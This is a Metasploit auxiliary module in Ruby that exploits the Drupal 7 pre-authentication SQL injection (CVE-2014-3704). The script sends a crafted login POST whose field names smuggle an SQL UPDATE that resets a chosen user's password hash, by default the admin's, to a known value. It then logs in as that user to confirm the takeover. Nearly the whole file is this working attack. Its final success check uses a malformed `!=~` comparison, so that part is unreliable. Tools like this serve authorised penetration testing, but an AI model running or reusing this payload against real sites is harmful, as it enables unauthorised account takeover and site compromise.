##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Drupal 7 SQL Injection - Password Change',
      'Description'    => %q{
          This module exploits a SQL injection vulnerability in
          Drupal 7 to update the password of a selected user 
          to 'drupal'
      },
      'Author'         =>
        [
          'Stefan Horst',  # Vulnerability discovery
          'Charlie Briggs'
        ],

      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', 'CVE-2014-3704'],
          ['URL', 'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html'],
          ['URL', 'https://www.drupal.org/SA-CORE-2014-005']
        ],
      'DisclosureDate' => 'Oct 15 2014'))

    register_options(
      [
        OptString.new('TARGETURI', [true, "The full URI to Drupal", "/"]),
        OptString.new('USERNAME', [true, "Username of target user", "admin"])
      ], self.class)
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path)
    })

    if res and res.code == 200 and res.body.to_s =~ /form_build_id/
      return Msf::Exploit::CheckCode::Appears
    end

    return Msf::Exploit::CheckCode::Safe
  end

  def run
    print_status("#{peer} - Attempting to update password hash for user '#{datastore['USERNAME']}'")

    hash = "$S$Drl0vgZ9yuU9uc4JyaTMHxMPriC7q/PsOUOx52fCrVQSTpI/Tu4x"
    sqli = "name[lol;update+{users}+set+pass%3d'#{hash}'+where+name%3d'#{datastore['USERNAME']}';--]=lol&name[lol]=lol&pass=lol&&form_build_id=lol&form_id=user_login&op=Log+in"

    res = send_request_cgi({
        'method'   => 'POST',
        'uri'      => normalize_uri(target_uri.path),
        'vars_get' =>  {
            'q' => 'user',
        },
        'data' => sqli
    })

    if res and res.code == 200
        print_status("#{peer} - Received 200, checking ability to login...")

        check_login(datastore['USERNAME'], 'drupal')
    else
        print_error("Rut roh. Something went wrong :/")
    end
  end

  def check_login(username, password)
    res = send_request_cgi({
        'method'    => 'POST',
        'uri'       => normalize_uri(target_uri.path),
        'vars_get'  => {
            'q' => 'user'
        },
        'vars_post' => {
            'name'          => username,
            'pass'          => password,
            'form_build_id' => 'lol',
            'form_id'       => 'user_login',
            'op'            => 'Log In'
        }
    })

    if res and res.code == 302
      print_status("#{peer} - Received 302, following...")
      
      redirect = URI(res.headers['Location']).path
      cookie   = res.headers['Set-Cookie']

      res = send_request_cgi({
          'method'    => 'GET',
          'uri'       => redirect,
          'headers'   => {
              'Cookie' => cookie
          }
      })

      if res and res.code == 200
        check_content(res.body.to_s, username, password)
      end
    elsif res and res.code == 200
      check_content(res.body.to_s, username, password)
    end
  end

  def check_content(body, username, password)
    if body !=~ /not-logged-in/
      print_good("Success! Logged in as #{username}:#{password}")
    else
      print_error("Unable to log in, perhaps this site is patched!")
    end
  end
end